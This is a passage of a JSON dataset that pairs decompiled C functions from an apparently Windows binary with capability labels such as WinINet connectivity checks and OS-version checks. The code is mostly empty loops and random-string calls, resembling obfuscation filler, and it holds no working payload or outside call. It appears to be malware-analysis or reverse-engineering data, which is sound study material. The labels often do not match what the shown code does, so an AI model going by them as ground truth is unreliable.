        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0041836a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint noname_10, uint noname_11, uint arg_38h, uint arg_3ch)\n\n{\n    char cVar1;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_9ch;\n    uint var_84h;\n    uint var_6ah;\n    uint var_4dh;\n    uchar var_33h;\n    uchar var_32h;\n    uint var_31h;\n    uint var_24h;\n    ulong uStack36;\n    uchar var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_14h = 0x360;\n    fcn.00483110();\n    fcn.004b21e0(\"mtbkdhqhxdwwhfwrlpdxsidc\", &var_6ah);\n    fcn.00483140();\n    var_15h = 1;\n    uStack36 = *0x5228d0;\n    var_24h = 0x4aa;\n    stack0xffffffcc = *0x5228d8;\n    fcn.00483110();\n    fcn.004b21e0(0x51cc95, &var_6ah + 1);\n    fcn.00483140();\n    var_31h._0_1_ = 0;\n    var_32h = 0;\n    for (var_ch = 0x25; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x51cc95, &var_4dh);\n    fcn.00483110();\n    fcn.004b21e0(0x51cc95, &var_33h);\n    cVar1 = fcn.004c09a0(&var_4dh + 1, &var_6ah + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x17; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 701
    },
    "00418644": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00418644(uint noname_0, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint in_ECX;\n    uint var_60h;\n    uint var_5ch;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uint var_39h;\n    uchar var_2dh;\n    uint var_2ch;\n    ulong uStack44;\n    uchar var_19h;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_18h = 0x261;\n    var_19h = 1;\n    uStack44 = *0x5228f0;\n    var_2ch = 0x16ee;\n    var_2dh = 0;\n    stack0xffffffc4 = *0x5228f8;\n    var_39h._0_1_ = 1;\n    var_3ah = 1;\n    for (var_ch = 8; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0xe; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (var_14h = 0x11; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"aosgacsqmha\", &var_3bh);\n    fcn.00483140();\n    return in_ECX;\n}\n",
        "token_count": 439
    },
    "00418724": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00418724(void)\n\n{\n    char cVar1;\n    uint var_fch;\n    uint var_f4h;\n    uint var_dch;\n    uint var_c2h;\n    uint var_a5h;\n    uint var_89h;\n    uint var_6dh;\n    uint var_51h;\n    uint var_35h;\n    uchar var_1ah;\n    int32_t var_19h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"tlbfucqpuefvhdbukojbkdcbvyrfghfdmdcyikeqwvqkphxhyrxkxzzrlwxbapoiqpnw\", &var_c2h);\n    fcn.00483140();\n    var_19h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"dmwcxiyfrxyrnmabykaciushdjmzxbopntygdlicbufxrtfuqgsumgzacefkngfzrvlidqdfzxk\", &var_c2h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"tlbfucqpuefvhdbukojbkdcbvyrfghfdmdcyikeqwvqkphxhyrxkxzzrlwxbapoiqpnw\", &var_a5h);\n    fcn.00483110();\n    fcn.004b21e0(\"tlbfucqpuefvhdbukojbkdcbvyrfghfdmdcyikeqwvqkphxhyrxkxzzrlwxbapoiqpnw\", &var_89h);\n    cVar1 = fcn.004c1070(&var_a5h + 1, &var_c2h + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x58; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"dmwcxiyfrxyrnmabykaciushdjmzxbopntygdlicbufxrtfuqgsumgzacefkngfzrvlidqdfzxk\", &var_6dh);\n    fcn.00483110();\n    fcn.004b21e0(\"dmwcxiyfrxyrnmabykaciushdjmzxbopntygdlicbufxrtfuqgsumgzacefkngfzrvlidqdfzxk\", &var_51h);\n    cVar1 = fcn.004c1070(&var_6dh + 1, &var_89h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 100; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    for (var_14h = 0x61; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"dmwcxiyfrxyrnmabykaciushdjmzxbopntygdlicbufxrtfuqgsumgzacefkngfzrvlidqdfzxk\", &var_35h);\n    fcn.00483110();\n    fcn.004b21e0(\"dmwcxiyfrxyrnmabykaciushdjmzxbopntygdlicbufxrtfuqgsumgzacefkngfzrvlidqdfzxk\", &var_1ah);\n    cVar1 = fcn.004c09a0(&var_35h + 1, &var_51h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffe4 = 0x41; 0 < stack0xffffffe4; unique0x00007a80 = stack0xffffffe4 + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 1;\n}\n",
        "token_count": 1100
    },
    "00418ac4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00418ac4(uint noname_0, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x5d; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return 0;\n}\n",
        "token_count": 171
    },
    "00418b20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nfloat10 __cdecl\nfcn.00418b20(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint noname_9, uint arg_30h)\n\n{\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_5h;\n    \n    for (stack0xfffffff8 = 3; 0 < stack0xfffffff8; unique0x00007a80 = stack0xfffffff8 + -1) {\n    }\n    return *0x522918;\n}\n",
        "token_count": 204
    },
    "00418b88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00418b88(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_94h;\n    uint var_7ch;\n    uint var_62h;\n    uint var_45h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uint var_29h;\n    uint var_1ch;\n    ulong uStack28;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    var_dh._0_1_ = 0;\n    uStack28 = *0x522920;\n    var_1ch = 0x90;\n    fcn.00483110();\n    fcn.004b21e0(\"jpwuknkiajvuijjpaapfbbpypdyabqdgayaqjxnpzpbgkuvxatenfqucuyt\", &var_62h);\n    fcn.00483140();\n    stack0xffffffd4 = *0x522928;\n    var_29h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"klqbsljkdtxwdlqlimrufnmdrsuekfq\", &var_62h + 1);\n    fcn.00483140();\n    var_2ah = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"jpwuknkiajvuijjpaapfbbpypdyabqdgayaqjxnpzpbgkuvxatenfqucuyt\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"jpwuknkiajvuijjpaapfbbpypdyabqdgayaqjxnpzpbgkuvxatenfqucuyt\", &var_2ch);\n    cVar1 = fcn.004c1070(&var_45h + 1, &var_62h + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xfffffff0 = 0x52; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"crreyx\", &var_2bh);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 734
    },
    "00419b10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.00419b10(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint var_58h;\n    uint var_54h;\n    uint var_4ch;\n    uint var_44h;\n    uint var_29h;\n    ulong uStack36;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_18h = 0x316;\n    fcn.00483110();\n    fcn.004b21e0(0x519e1c, &var_29h);\n    fcn.00483140();\n    uStack36 = *0x522a30;\n    stack0xffffffd4 = *0x522a38;\n    for (var_ch = 0x54; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x52; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (var_14h = 0; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 317
    },
    "00419c2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00419c2c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_5dh;\n    uint var_41h;\n    uchar var_25h;\n    uint var_24h;\n    uchar var_1eh;\n    uchar var_1dh;\n    uint var_1ch;\n    ulong uStack28;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    var_dh._0_1_ = 0;\n    uStack28 = *0x522a50;\n    fcn.00483110();\n    fcn.004b21e0(\"lsijltodrdd\", &var_5dh);\n    fcn.00483140();\n    var_1ch = 0xe2;\n    var_1dh = 0;\n    var_1eh = 0;\n    var_24h = 0x637;\n    fcn.00483110();\n    fcn.004b21e0(\"lsijltodrdd\", &var_41h);\n    fcn.00483110();\n    fcn.004b21e0(\"lsijltodrdd\", &var_25h);\n    cVar1 = fcn.004c09a0(&var_41h + 1, &var_5dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xfffffff0 = 10; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n        }\n    }\n    fcn.004b2800();\n    return 0x1083;\n}\n",
        "token_count": 485
    },
    "00419db6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00419db6(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_44h;\n    uint var_2ch;\n    ulong uStack44;\n    uint var_1ch;\n    ulong uStack28;\n    uchar var_eh;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    var_dh._0_1_ = 0;\n    var_eh = 1;\n    uStack28 = *0x522a58;\n    fcn.00483110();\n    fcn.004b21e0(\"wainmxesjmuizcpgdhuuufnwogioqwxa\", &var_2ch);\n    fcn.00483140();\n    var_1ch = 0xe2d;\n    uStack44 = *0x522a60;\n    var_2ch._3_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"rebbvadksfygeohrpdabxsgpwinwrfhfinoltqtslfuxnfaqhstabwtcplkurazaxbvrbcadr\", &var_2ch + 1);\n    fcn.00483140();\n    var_2ch._2_1_ = 0;\n    for (stack0xfffffff0 = 0x50; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 1;\n}\n",
        "token_count": 498
    },
    "00419ef8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.00419ef8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_cch;\n    uint var_b4h;\n    uint var_9ch;\n    uint var_84h;\n    uint var_6ch;\n    uchar var_68h [27];\n    uint var_4dh;\n    uint var_31h;\n    uint var_24h;\n    ulong uStack36;\n    ulong uStack28;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack28 = *0x522a68;\n    uStack36 = *0x522a70;\n    fcn.00483110();\n    fcn.004b21e0(0x51d2a2, &var_6ch);\n    fcn.00483140();\n    var_24h = 0x1c26;\n    fcn.00483110();\n    fcn.004b21e0(\"iftuheachf\", &var_6ch + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"tlguvpuuahmjnjdvtsjtcitxrdfqfzwvemaryovgkvmuoulcvpxmssaecsasnxrvegtrhlzvaxelgvyfagosijjbhrbt\", \n                 &var_6ch + 2);\n    fcn.00483140();\n    stack0xffffffcc = *0x522a78;\n    fcn.00483110();\n    fcn.004b21e0(\"vrcknkgkeymrvbenqpig\", &var_6ch + 3);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(0x51d2a2, &var_4dh);\n    fcn.00483110();\n    fcn.004b21e0(0x51d2a2, &var_31h);\n    cVar1 = fcn.004c1070(&var_4dh + 1, var_68h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0xf; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 665
    },
    "0041a1a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0041a1a6(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    char cVar1;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_70h;\n    uint var_55h;\n    uint var_39h;\n    uchar var_1dh;\n    uint var_1ch;\n    uchar var_15h;\n    uint var_14h;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    var_dh._0_1_ = 0;\n    var_14h = 0x1620;\n    fcn.00483110();\n    fcn.004b21e0(\"mdkjvdpvksuijncthhywqxrkfoucyspigqeqqawashgsigxosxfdrouzbqfjgvdgzsdptocqcw\", &var_55h);\n    fcn.00483140();\n    var_15h = 0;\n    var_1ch = 0x3e;\n    fcn.00483110();\n    fcn.004b21e0(\"mdkjvdpvksuijncthhywqxrkfoucyspigqeqqawashgsigxosxfdrouzbqfjgvdgzsdptocqcw\", &var_39h);\n    fcn.00483110();\n    fcn.004b21e0(\"mdkjvdpvksuijncthhywqxrkfoucyspigqeqqawashgsigxosxfdrouzbqfjgvdgzsdptocqcw\", &var_1dh);\n    cVar1 = fcn.004c1070(&var_39h + 1, &var_55h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xfffffff0 = 0x16; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n        }\n    }\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 615
    },
    "0041a32c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nfloat10 fcn.0041a32c(void)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_bch;\n    uint var_b8h;\n    uint var_a0h;\n    uint var_88h;\n    uint var_6fh;\n    uint var_51h;\n    uchar var_35h;\n    uint var_34h;\n    ulong uStack52;\n    uint var_28h;\n    uint var_24h;\n    ulong uStack36;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_14h = 0x26c;\n    uStack36 = *0x522a80;\n    var_24h = 0xf6e;\n    fcn.00483110();\n    fcn.004b21e0(\"szvxqsrurqhqkfzykzhdhbeauoqbydepyknnpiucaugfywsstszmlpjlkvftsdrkevgihejaw\", &var_6fh);\n    fcn.00483140();\n    var_28h = 0x301;\n    fcn.00483110();\n    fcn.004b21e0(\"owwviqfjg\", &var_6fh + 1);\n    fcn.00483140();\n    uStack52 = *0x522a88;\n    var_34h = 0x971;\n    fcn.00483110();\n    fcn.004b21e0(\"qrmduvdxkgxuzolrpdqvdllmllxvcypqikyp\", &var_6fh + 2);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"owwviqfjg\", &var_51h);\n    fcn.00483110();\n    fcn.004b21e0(\"owwviqfjg\", &var_35h);\n    cVar2 = fcn.004c09a0(&var_51h + 1, &var_6fh + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x522a90;\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x41; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x30; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 654
    },
    "0041a57c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl\nfcn.0041a57c(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint noname_5, uint arg_20h, \n            uint noname_7, uint arg_28h, uint arg_2ch)\n\n{\n    double dVar1;\n    uint var_88h;\n    uint var_84h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_42h;\n    uint var_31h;\n    ulong uStack44;\n    uint var_20h;\n    uint var_19h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    stack0xffffffe4 = *0x522a98;\n    var_19h._0_1_ = 1;\n    var_20h = 0x15b4;\n    uStack44 = *0x522aa0;\n    stack0xffffffcc = *0x522aa8;\n    var_31h._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"wsliwiztjnxnfmxcigasgoudxdpjbnrlnrdplqeecllnd\", &var_42h);\n    fcn.00483140();\n    dVar1 = *0x522ab8;\n    stack0xffffffbc = *0x522ab0;\n    var_42h._1_1_ = 1;\n    for (var_ch = 0x42; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 438
    },
    "0041a66c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a66c(uint noname_0, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 10; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return 0xf8d5;\n}\n",
        "token_count": 126
    },
    "0041a6a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041a6a6(uint noname_0, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_ech;\n    uint var_d4h;\n    uint var_bah;\n    uint var_9dh;\n    uint var_81h;\n    uint var_65h;\n    uchar var_4ah;\n    uchar var_49h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    ulong uStack60;\n    ulong uStack52;\n    ulong uStack44;\n    int32_t var_19h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"yptdfkjkrspofnlzoh\", &var_bah);\n    fcn.00483140();\n    var_19h._0_1_ = 0;\n    uStack44 = *0x522ac0;\n    fcn.00483110();\n    fcn.004b21e0(\"fdbsbugkipufmakymsdmpvzoysdconbsteakfpknrgdjbgwrbhokswwywqtzpmtztmdnjlfz\", &var_bah + 1);\n    fcn.00483140();\n    uStack52 = *0x522ac8;\n    uStack60 = *0x522ad0;\n    var_3ch = 0x11c4;\n    var_40h = 0x1fc9;\n    var_44h = 0xa9;\n    var_48h = 0x1c8;\n    for (var_ch = 0x1d; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"yptdfkjkrspofnlzoh\", &var_9dh);\n    fcn.00483110();\n    fcn.004b21e0(\"yptdfkjkrspofnlzoh\", &var_81h);\n    cVar1 = fcn.004c1070(&var_9dh + 1, &var_bah + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x5d; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"fdbsbugkipufmakymsdmpvzoysdconbsteakfpknrgdjbgwrbhokswwywqtzpmtztmdnjlfz\", &var_65h);\n    fcn.00483110();\n    fcn.004b21e0(\"fdbsbugkipufmakymsdmpvzoysdconbsteakfpknrgdjbgwrbhokswwywqtzpmtztmdnjlfz\", &var_4ah);\n    cVar1 = fcn.004c09a0(&var_65h + 1, &var_81h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_14h = 0x31; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    for (stack0xffffffe4 = 0x10; 0 < stack0xffffffe4; unique0x00007a80 = stack0xffffffe4 + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x51d47d, &var_49h);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 1025
    },
    "0041aa52": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0041aa52(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint noname_5, uint arg_20h)\n\n{\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_3dh;\n    ulong uStack60;\n    uint var_2ch;\n    ulong uStack44;\n    uint var_19h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0xcf;\n    stack0xffffffe4 = *0x522ad8;\n    var_19h._0_1_ = 1;\n    uStack44 = *0x522ae0;\n    var_2ch = 0xf51;\n    uStack60 = *0x522ae8;\n    fcn.00483110();\n    fcn.004b21e0(\"dpxsqknxcgzslgfpusnyfuxqbpgysftefiyoypsbtowfrfxymenaxmocxrvdbszwieavfqgghs\", &var_3dh);\n    fcn.00483140();\n    stack0xffffffc0 = 0x239;\n    for (var_ch = 0x62; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 384
    },
    "0041ab20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
